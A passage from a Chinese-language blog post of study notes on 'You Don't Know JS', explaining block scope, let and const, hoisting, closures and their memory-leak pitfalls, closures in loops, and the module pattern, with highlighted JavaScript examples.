class="comment">//假如我们在这里继续调用someReallyBigData就会形成闭包，导致不能垃圾回收</span></span><br><span class="line">&#125;，<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>click 函数的点击回调并不需要 someReallyBigData 变量。理论上这意味着当 process(..) 执行后，在内存中占用大量空间的数据结构就可以被垃圾回收了。但是，由于 click 函数形成了一个覆盖整个作用域的闭包，JavaScript 引擎极有可能依然保存着这个结构(取决于具体实现)。<br>但显式使用块作用域可以让引擎清楚地知道没有必要继续保存 someReallyBigData 了:</p> <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 在这里做点有趣的事情</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 在这个块中定义的内容可以销毁了！</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> someReallyBigData = &#123; .. &#125;;</span><br><span class="line">    process( someReallyBigData );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById( <span class="string">&quot;my_button&quot;</span> );</span><br><span class="line">btn.addEventListener( <span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span> <span class="title">click</span>(<span class="params">evt</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;button clicked&quot;</span>);</span><br><span class="line">&#125;,<span class="literal">false</span> );</span><br></pre></td></tr></table></figure><ul><li>let循环</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123; </span><br><span class="line"> <span class="built_in">console</span>.log( i );</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( i ); <span class="comment">// ReferenceError</span></span><br></pre></td></tr></table></figure><p>for 循环头部的 let 不仅将 i 绑定到了 for 循环的块中，事实上它将其重新绑定到了循环的每一个迭代中，确保使用上一个循环迭代结束时的值重新进行赋值。这样就避免了i对外部函数作用域的污染。</p><h4 id="3-4-4-const"><a href="#3-4-4-const" class="headerlink" title="3.4.4 const"></a>3.4.4 const</h4><p>除了 let 以外，ES6 还引入了 const，同样可以用来创建块作用域变量，但其值是固定的(常量)。之后任何试图修改值的操作都会引起错误。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span> (foo) &#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">const</span> b = <span class="number">3</span>; <span class="comment">// 包含在 if 中的块作用域常量</span></span><br><span class="line">  a = <span class="number">3</span>; <span class="comment">// 正常!</span></span><br><span class="line">  b = <span class="number">4</span>; <span class="comment">// 错误! </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// 3</span></span><br><span class="line"><span class="built_in">console</span>.log( b ); <span class="comment">// ReferenceError!</span></span><br></pre></td></tr></table></figure><h3 id="3-5-小结"><a href="#3-5-小结" class="headerlink" title="3.5 小结"></a>3.5 小结</h3><p>函数是 JavaScript 中最常见的作用域单元。本质上，声明在一个函数内部的变量或函数会在所处的作用域中“隐藏”起来，可以有效地与外部作用域隔开。</p><p>但函数不是唯一的作用域单元。块作用域指的是变量和函数不仅可以属于所处的作用域，也可以属于某个代码块(通常指 { .. } 内部)即块作用域。ES6中就提供了let和const来帮助创建块作用域。</p><h2 id="第四章-提升"><a href="#第四章-提升" class="headerlink" title="第四章 提升"></a>第四章 提升</h2><h3 id="4-1-先有鸡-赋值-还是先有蛋-声明"><a href="#4-1-先有鸡-赋值-还是先有蛋-声明" class="headerlink" title="4.1 先有鸡(赋值)还是先有蛋(声明)"></a>4.1 先有鸡(赋值)还是先有蛋(声明)</h3><p>考虑第一段代码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> a; </span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br></pre></td></tr></table></figure><p>输出结果是2，而不是undefined</p><p>考虑第二段代码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a ); </span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>输出结果是undefined，而不是ReferenceError<br>考虑完以上代码，你应该会考虑这个问题：到底是声明(蛋)在前，还是赋值(鸡)在前？</p><h3 id="4-2-编译器再度来袭"><a href="#4-2-编译器再度来袭" class="headerlink" title="4.2 编译器再度来袭"></a>4.2 编译器再度来袭</h3><p>引擎会在解释 JavaScript 代码之前首先对其进行编译。编译阶段中的一部分工作就是<strong>找到所有的声明，并用合适的作用域将它们关联起来。 之后引擎会询问作用域，对声明进行赋值操作。</strong></p><p>那么，在编译阶段找到所有的声明后，编译器又做了什么？答案就是<strong>提升</strong>。以上节的第一段代码为例，<strong>当看到 var a = 2; 时，可能会认为这是一个声明。但 JavaScript 实际上会将其看成两个声明:var a;和a = 2;</strong> 第一个定义声明是在编译阶段进行的，第二个赋值声明会被留在原地等待执行阶段。在第一个声明在编译阶段时，编译器会对<code>var a;</code>声明进行提升(即把<code>var a;</code>置于所在作用域的最上面)；而<code>a = 2;</code>则会保持所在位置不动。此时代码会变成</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a; </span><br><span class="line">a = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br></pre></td></tr></table></figure><p>由此可知，<strong>在编译阶段，编译器会对声明进行提升.即先有蛋(声明)后有鸡(赋值)。</strong>  <strong>哪些声明会被进行提升？</strong></p><ul><li>变量声明:例如上例中的<code>var a;</code>.不包括后面的<code>a = 2;</code>即<strong>不包含有赋值操作的声明。</strong></li><li>函数声明:注意<strong>是函数声明,而不是函数表达式</strong>！函数声明提升，是将整个函数进行提升，而不是仅仅函数名的提升。</li></ul><h3 id="4-3-函数优先"><a href="#4-3-函数优先" class="headerlink" title="4.3 函数优先"></a>4.3 函数优先</h3><p>函数声明和变量声明都会被提升，但是函数会首先被提升，然后才是变量。<br>考虑以下代码:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">foo(); <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">var</span> foo;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line">foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>会输出 1 而不是 2 ！这个代码片段会被引擎理解为如下形式:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line">foo(); <span class="comment">// 1</span></span><br><span class="line">foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意，var foo 尽管出现在 function foo()… 的声明之前，但它是重复的声明(因此被忽略了)，因为函数声明会被提升到普通变量之前。<br><strong>注意:</strong> js会忽略前面已经声明的声明(不管是变量声明还是函数声明，只要其名称相同，则后续不会再进行重复声明)。但是对该变量新的赋值，会覆盖之前的值。<br><strong>一句话概括:函数声明的优先级高于变量声明，会排在它前面。</strong></p><h3 id="4-4-小结"><a href="#4-4-小结" class="headerlink" title="4.4 小结"></a>4.4 小结</h3><ul><li>对于<code>var a = 2</code>  JavaScript引擎会将<code>var a</code>和 <code>a = 2</code>当作两个单独的声明，第一个是编译阶段的任务，而第二个则是执行阶段的任务。</li><li>不论作用域中的声明出现在什么地方，都将在代码本身被执行前首先进行处理。 可以将这个过程形象地想象成所有的声明(变量和函数)都会被“移动”到各自作用域的最顶端，这个过程被称为提升。</li><li>声明本身会被提升，而包括函数表达式的赋值在内的赋值操作并不会提升(即赋值操作都不会提升)。</li><li>注意：当普通的 var 声明和函数声明混合在一起的时候，并且声明相同时(var的变量名和函数名相同时）会引发js对重复声明的忽略。一定要注意<strong>避免重复声明!</strong></li></ul><h2 id="第五章-作用域闭包"><a href="#第五章-作用域闭包" class="headerlink" title="第五章 作用域闭包"></a>第五章 作用域闭包</h2><h3 id="5-1-启示"><a href="#5-1-启示" class="headerlink" title="5.1 启示"></a>5.1 启示</h3><ul><li>JavaScript中闭包无处不在，你只需要能够识别并拥抱它。</li><li>闭包是基于词法作用域书写代码时所产生的自然结果，甚至不需要为了利用它们而有意识地创建闭包。</li></ul><h3 id="5-2-实质问题-amp-amp-5-3-现在我懂了"><a href="#5-2-实质问题-amp-amp-5-3-现在我懂了" class="headerlink" title="5.2 实质问题 &amp;&amp; 5.3 现在我懂了"></a>5.2 实质问题 &amp;&amp; 5.3 现在我懂了</h3><p><strong>什么是闭包？(广义版)</strong>     </p><ul><li><strong>书中解释:</strong> 当函数可以记住并访问所在的词法作用域时，就产生了闭包，即使函数是在当前词法作用域之外执行。     </li><li><strong>MDN解释:</strong> 闭包是<strong>函数</strong>和声明该函数的<strong>词法环境</strong>的组合。     </li><li><strong>极简版：</strong>JavaScript中的函数就会形成闭包。     </li></ul><p><strong>我们日常使用时所说的闭包(狭义版，严格意义上的):</strong><br>为了便于对闭包作用域的观察和使用，我们实际使用时会将闭包的函数作用域暴露给当前词法作用域之外，也就是本书一直强调的<strong>闭包函数需要在它本身的词法作用域以外执行</strong>。作者认为符合这个条件才称得上是真正的闭包(也就是我们日常使用常说的’使用闭包’，并且<strong>使用任何回调函数其实也是闭包</strong>).<br>所以狭义版就是:<strong>闭包是函数和声明该函数的词法环境的组合，并且将闭包的函数作用域暴露给当前词法作用域之外.</strong>    </p><p><strong>闭包暴露函数作用域的三种方式:</strong>     </p><ul><li>通过外部函数的参数进行暴露</li></ul> <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">   <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    baz(a) <span class="comment">//通过外部函数的参数进行暴露</span></span><br><span class="line">   &#125;</span><br><span class="line">   bar(); </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">baz</span>(<span class="params">val</span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log( val ); <span class="comment">// 2 </span></span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><ul><li>通过外部作用域的变量进行暴露</li></ul> <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> val;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">   <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    val=a <span class="comment">//通过外部作用域的变量进行暴露</span></span><br><span class="line">   &#125;</span><br><span class="line">   bar(); </span><br><span class="line">&#125;;</span><br><span class="line">foo();</span><br><span class="line"><span class="built_in">console</span>.log(val)  <span class="comment">//2</span></span><br></pre></td></tr></table></figure><ul><li>通过return直接将整个函数进行暴露</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">   <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> bar <span class="comment">//通过return直接将整个函数进行暴露</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> val=foo();</span><br><span class="line">val()  <span class="comment">//2</span></span><br></pre></td></tr></table></figure><p><strong>关于闭包的内存泄露问题:</strong><br>首先必须声明一点:<strong>使用闭包并不一定会造成内存泄露，只有使用闭包不当才可能会造成内存泄露。</strong><br>为什么闭包可能会造成内存泄露呢？原因就是上面提到的，因为它一般会<strong>暴露自身的作用域</strong>给外部使用。如果使用不当，就可能导致该内存一直被占用，无法被JS的垃圾回收机制回收，就造成了内存泄露。<br><strong>注意:</strong> <strong>即使闭包里面什么都没有，闭包仍然会隐式地引用它所在作用域里的所用变量。</strong>   正因为这个隐藏的特点，闭包经常会发生不易发现的内存泄漏问题。<br><strong>常见哪些情况使用闭包会造成内存泄露:</strong>    </p><ul><li>使用定时器未及时清除。因为计时器只有先停止才会被回收，所以办法很简单，将定时器及时清除，并将造成内存的变量赋值为null(变成空指针)</li><li>相互循环引用。这是经常容易犯的错误，并且也不容易发现.举个栗子:</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">var</span> a = &#123;&#125;; </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log(a); </span><br><span class="line">  &#125;; </span><br><span class="line">  a.fn = bar; </span><br><span class="line">  <span class="keyword">return</span> bar; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里形成了bar和a的相互循环引用。可能有人说bar里不使用<code>console.log(a)</code>不就没有引用了吗？就不会造成内存泄露了。NONONO，bar作为一个闭包，即使它内部什么都没有，<strong>foo中的所有变量都还是隐使地被 bar所引用</strong>。真正的解决办法就是，不要将<code>a.fn = bar</code>.</p><ul><li>将闭包引用到全局变量上。因为全局变量是只有当页面被关闭的时候才会被回收。</li><li>在闭包中对DOM进行不当的引用。这个常见于老IE浏览器。</li></ul><p>总而言之，<strong>解决办法就是使闭包能正常引用，能被正常回收。如果实在不行，就是在使用完后，手动将变量赋值null，强行进行垃圾回收。</strong></p><h3 id="5-4-循环和闭包"><a href="#5-4-循环和闭包" class="headerlink" title="5.4 循环和闭包"></a>5.4 循环和闭包</h3><p>看如下例子:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123; </span><br><span class="line">  <span class="built_in">setTimeout</span>( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log( i );</span><br><span class="line">  &#125;， i*<span class="number">1000</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们期望的结果是分别输出数字 1~5，每秒一次，每次一个。但实际结果是，这段代码在运行时会以每秒一次的频率输出五次 6。<strong>为什么会这样？</strong>     </p><ul><li>timer毫无疑问是一个闭包，它可以访问到外部的变量i。</li><li>在进行for循环时，timer()会被重复执行5次，也就是它会 console.log( i )5次，这5次<code>i</code>其实是<strong>同一个</strong><code>i</code>，它是来自于外部作用域，即for里面声明的i。</li><li>在<strong>词法作用域中</strong>变量i只可能对应一个唯一的值，即<strong>变量和它的值是一一对应的，不会变化</strong>。</li><li>那这个值到底是多少呢？<strong>这个值就是最终值！</strong> i的最终值是6，即for循环完后<code>i</code>的值。</li><li>当引擎执行<code>console.log( i )</code>时，它会询问i所对应的作用域，问它i的值是多少。这个时候作用域进行RHS查询得到的结果就是最终值6。        </li></ul><p><strong>为什么我们会以为分别输出1~5？</strong>     </p><p>因为在for循环中，我们错以为每一次循环时，函数所输出的i是根据循环动态变化的，即是1~5累加变化的。但实际上它所访问的i是同一个固定不变的值，即最终值6。可能你会有这样的疑惑，那我循环还有意义吗？i其实一开始就确定是6了.没有变化过！错！ <code>i</code>变化过，它的确是从1逐步增加到6的，只是外部作用域的i值只可能是循环完后的最终值，并且<strong>函数timer()并没有保存每次i变化的值</strong>，它只是访问了外部作用域的i值即最终的值6。 OK，我们知道了出错的地方，就是我们<strong>没有把每次i的值保存在一个独立的作用域中。</strong><br>接下来，看下这个改进的例子结果是多少.    </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123; </span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( i );</span><br><span class="line">    &#125;， i*<span class="number">1000</span> );</span><br><span class="line">  &#125;)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它的最终值仍然是5个6。上例中，它用了一个匿名函数包裹了定时器，并立即执行。在进行for循环时，会创造5个独立的函数作用域(由匿名函数创建的，因为它是闭包函数)。但是这5个独立的函数作用域里的i也全都是对外部作用域的引用，即它们访问的都是i的最终值6。这并不是我们想要的，我们要的是5个独立的作用域，并且每个作用域都保存一个”当时”<code>i</code>的值。</p><p><strong>解决办法:</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123; </span><br><span class="line">  (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> j =i;</span><br><span class="line">    <span class="built_in">setTimeout</span>( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( j );</span><br><span class="line">    &#125;， j*<span class="number">1000</span> );</span><br><span class="line">  &#125;)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//分别输出数字 1~5，每秒一个。</span></span><br></pre></td></tr></table></figure><p>这样改写后，匿名函数每次都通过j保存了每次i值，这样<code>i</code>值就<strong>通过j保存在了独立的作用域中</strong>。注意此时保存的i值是’当时’的值，并不是循环完后的最终值。这样循环完后，实际上就创建了5个独立的作用域，每个作用域都保存了一个’当时’i的值(通过j)。当引擎执行<code>console.log(j)</code>询问其对应的独立作用域时，得到的值就是’当时’保存的值。<br>还可以进一步简写为这样:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123; </span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params">j</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( j );</span><br><span class="line">    &#125;， j*<span class="number">1000</span> );</span><br><span class="line">  &#125;)(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//结果与上面相同</span></span><br></pre></td></tr></table></figure><p><strong>利用块作用域进行解决:</strong><br>在es6中，我们不仅可以使用函数来创建一个独立的作用域，我们还可以使用let声明来创建一个独立的块作用域(在<code>&#123;&#125;</code>内)。所以我们还可以这样改写:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123; </span><br><span class="line">  <span class="built_in">setTimeout</span>( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log( i );</span><br><span class="line">  &#125;， i*<span class="number">1000</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//结果与上面相同</span></span><br></pre></td></tr></table></figure><p>在每次循环时，let都会对i进行声明，并通过循环自带的<code>&#123;&#125;</code>创建一个独立的块作用域。并且let声明的i，保存了’当时’<code>i</code>的值在当前块作用域里，因此当引擎执行<code>console.log(i)</code>时，它会询问对应的块作用域上i的值，得到的结果就是’当时’保存的值。</p><p><strong>延伸:</strong><br>实际上块作用域可以称得上一个’伪’闭包(之所以是伪，是因为闭包规定了只能是函数)。它几乎拥有闭包的所有特性，也可以创建一个独立的作用域，同样外部作用域不能访问块作用域的变量。但块作用域可以访问外部作用域，举个栗子:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">  &#123;  <span class="comment">//通过&#123;&#125; 显示表示块作用域</span></span><br><span class="line">    <span class="keyword">let</span> b = a;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;块作用域内&#x27;</span>，b) <span class="comment">//2</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;块作用域外&#x27;</span>，b) <span class="comment">//b is not defined</span></span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>说说不同点:   </p><ol><li>保存变量到块作用域，必须通过let声明。</li><li>块作用域不能和函数一样有名称(函数名)</li></ol><p>很多不方便使用闭包或者比较麻烦的时候，可以考虑通过块作用域进行解决。</p><p><strong>总结一下一般什么时候考虑使用闭包:</strong>     </p><ol><li>需要创建一个独立的作用域并隐藏一些变量或函数，不被外部使用；或者想保存一些外部作用域的变量或函数到这个独立作用域。</li><li>只想暴露<strong>一部分</strong>自身作用域的变量或函数给外部使用。</li></ol><h3 id="5-5-模块"><a href="#5-5-模块" class="headerlink" title="5.5 模块"></a>5.5 模块</h3><p>首先看下面的例子:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CoolModule</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> something = <span class="string">&quot;cool&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> another = [<span class="number">1</span>， <span class="number">2</span>， <span class="number">3</span>];</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log( something );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">doAnother</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log( another.join( <span class="string">&quot; ! &quot;</span> ) );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">doSomething</span>: doSomething，</span><br><span class="line">  <span class="attr">doAnother</span>: doAnother</span><br><span class="line">  &#125;; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> foo = CoolModule(); </span><br><span class="line"></span><br><span class="line">foo.doSomething(); <span class="comment">// cool</span></span><br><span class="line">foo.doAnother(); <span class="comment">// 1 ! 2 ! 3</span></span><br></pre></td></tr></table></figure><p>首先我们对上面这段代码进成分行分析:<br>私有数据变量:something， another<br>内部函数:doSomething， doAnother<br>直接说结论，上面这个例子就是模块模式。<strong>它return返回的这个对象也就是模块也被称为公共API。CoolModule()就是模块构造器或者叫模块函数。</strong><br><strong>注意</strong>:</p><ul><li><strong>这里的模块和我们所说的模块化开发不是完全一样的！</strong></li><li>模块不一定非要是标准对象，也可以是一个函数，函数本质上也是对象，函数也可以有自己的属性。</li><li>CoolModule() 只是一个函数，必须要通过调用它来创建一个模块实例。如果不执行外部函数，内部作用域和闭包都无法被创建。（因为函数调用一次才会创建一个该函数的作用域，包括创建它里面的变量和函数）</li></ul><p><strong>模块模式:</strong><br>模块模式需要具备以下2个条件：（结合上面例子）</p><ul><li>必须有外部的封闭函数(即CoolModule)，该函数必须至少被调用一次(每次调用都会创建一个新的模块实例–&gt;模块实例指的就是函数return返回的对象)。</li><li>封闭函数(即CoolModule)必须返回至少一个内部函数(即doSomething， doAnother)，这样内部函数才能在私有作用域中形成闭包，并且可以访问或者修改私有的状态(即something， another)。</li></ul><p><strong>模块:</strong><br>表面上看由模块函数(例子中的CoolModule)所返回的对象就是模块，但**模块还必须还包含模块函数的内部函数(即闭包函数)**。</p><p><strong>模块函数:</strong><br>模块函数也就是模块构造器，例子中的CoolModule().一般它有两个常见用法.</p><ul><li>通过接受参数，对输出的模块进行修改。</li><li>通过添加模块里添加相关的内部函数，实现对输出模块数据的增删改查。(书中用<code>命名将要作为公共API返回的对象</code>，我（原博客作者）觉得<code>命名</code>应该是用错了，应该是<code>修改</code>即增删改查更好)</li></ul><h4 id="5-5-1-现代的模块机制"><a href="#5-5-1-现代的模块机制" class="headerlink" title="5.5.1 现代的模块机制"></a><strong>5.5.1 现代的模块机制</strong></h4><p>大多数模块依赖加载器 / 管理器本质上都是将这种模块定义封装进一个友好的 API。<br>下面就介绍一个简单的模块管理器实现例子(对书中的例子进行逐行解读):</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先实例化我们的模块管理器，取名myModules</span></span><br><span class="line"><span class="keyword">var</span> MyModules=(<span class="function"><span class="keyword">function</span> <span class="title">Manager</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//作为我们的模块池，保存所有定义的模块</span></span><br><span class="line">    <span class="keyword">var</span> modules=&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *使用类似AMD的方式定义新模块，接收3个参数</span></span><br><span class="line"><span class="comment">     *name:模块名</span></span><br><span class="line"><span class="comment">     *deps:数组形式表示所依赖的其他模块</span></span><br><span class="line"><span class="comment">     *impl:模块功能的实现</span></span><br><span class="line"><span class="comment">    **/</span> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">name，deps，impl</span>) </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//遍历依赖模块数组的每一项，从程序池中取出对应的模块，并赋值.</span></span><br><span class="line"><span class="comment">//循环完后，deps由保存模块名的数组变成了保存对应模块的数组.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;deps.length;i++) &#123;</span><br><span class="line">            deps[i]=modules[deps[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将新模块存储进模块池，并通过apply注入它所依赖的模块(即遍历后的deps，实际上就是用deps作为impl的入参)</span></span><br><span class="line">        modules[name]=impl.apply(impl，deps);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//从模块池中取出对应模块</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> modules[name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//暴露定义模块和获取模块的两个api</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">define</span>: define，</span><br><span class="line">        <span class="attr">get</span>: get</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p><strong>说明:</strong>  后面书中说了这么一句<code>为了模块的定义引入了包装函数(可以传入任何依赖)</code>，这里包装函数指的是Manger()，同样也是我们上节提到的模块函数。首先说明下什么是包装函数：例如函数A当中还有一个函数B，当我们想要调用函数B的时候，则需要先调用函数A，那么函数A就叫做函数B的包装函数。也就是说我们想调用某个模块时，需要先调用它的包装函数即这里的Manger()；接着是后面那句<code>并且将返回值，也就是模块的 API，储存在一个根据名字来管理的模块列表中。</code>注意这里的返回值是指impl的返回值。</p><p>接着看通过管理器来定义和使用模块</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">MyModules.define(<span class="string">&#x27;bar&#x27;</span>，[]，<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hello</span> (<span class="params">who</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Let me introduce: &quot;</span> + who;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//返回公共API 即提供一个hello的接口</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">hello</span>:hello</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">MyModules.define(<span class="string">&#x27;foo&#x27;</span>，[<span class="string">&#x27;bar&#x27;</span>]，<span class="function"><span class="keyword">function</span> (<span class="params">bar</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> hungry = <span class="string">&quot;hippo&quot;</span>;</span><br><span class="line"></span><br><span class="line">    functin awesome () &#123;</span><br><span class="line"><span class="comment">//这里的bar为返回模块bar返回的公共API</span></span><br><span class="line">        <span class="built_in">console</span>.log( bar.hello( hungry ).toUpperCase() );</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//返回公共API 即提供一个awesome的接口</span></span><br><span class="line">    <span class="keyword">return</span> 